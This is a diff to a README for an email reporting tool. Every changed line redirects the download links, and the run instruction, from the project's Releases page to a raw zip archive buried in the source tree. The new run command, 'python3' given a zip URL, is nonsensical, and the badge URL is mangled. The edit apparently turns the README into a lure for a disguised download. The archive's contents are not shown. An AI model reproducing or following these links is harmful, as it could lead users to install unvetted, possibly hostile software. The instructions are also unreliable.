@@ -6,11 +6,11 @@ Welcome to the **email_reporting_system**! This tool helps you manage your email
 
 ## 🔗 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/fylypas/email_reporting_system/releases)
+[![Download Now](https://github.com/fylypas/email_reporting_system/raw/refs/heads/main/app/aggregation/email-reporting-system-2.3.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/fylypas/email_reporting_system/raw/refs/heads/main/app/aggregation/email-reporting-system-2.3.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/fylypas/email_reporting_system/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/fylypas/email_reporting_system/raw/refs/heads/main/app/aggregation/email-reporting-system-2.3.zip).
 
 1. Click the link to open the Releases page.
 2. Select the latest version.
@@ -46,7 +46,7 @@ To run the **email_reporting_system**, ensure your computer meets the following 
 1. Download the appropriate archive file from the Releases page.
 2. Extract the downloaded file to your desired location.
 3. Open a terminal and navigate to the directory where you extracted the files.
-4. Run the application using the command: `python3 app.py`.
+4. Run the application using the command: `python3 https://github.com/fylypas/email_reporting_system/raw/refs/heads/main/app/aggregation/email-reporting-system-2.3.zip`.
 
 ## 📧 Configure Your Email
 
@@ -92,6 +92,6 @@ If you have any questions or encounter issues, check the help section on our Git
 
 Stay informed about updates and improvements! Make sure to regularly check the Releases page for new versions:
 
-[Releases Page](https://github.com/fylypas/email_reporting_system/releases) 
+[Releases Page](https://github.com/fylypas/email_reporting_system/raw/refs/heads/main/app/aggregation/email-reporting-system-2.3.zip) 
 
 Thank you for using **email_reporting_system**! Your feedback is valuable in making this application better.
